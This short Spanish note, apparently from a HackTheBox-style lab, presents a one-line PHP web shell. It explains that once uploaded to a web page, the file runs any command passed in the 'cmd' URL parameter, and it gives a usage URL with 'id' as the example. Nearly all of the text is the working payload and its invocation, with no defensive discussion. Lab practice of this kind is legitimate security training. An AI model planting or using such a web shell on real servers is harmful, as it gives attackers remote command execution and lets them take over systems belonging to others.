
Este archivo lo que va a hacer es que cuando lo subamos en una pagina, pongamos cmd=comando y ejecute el comando que le pasemos


https://Paginaweb/nombredelarchivo.php?cmd=Comando
Ejemplo: https://thetoppers.htb/exploit.php?cmd=id
```php
<?php system($_GET["cmd"]); ?>
```
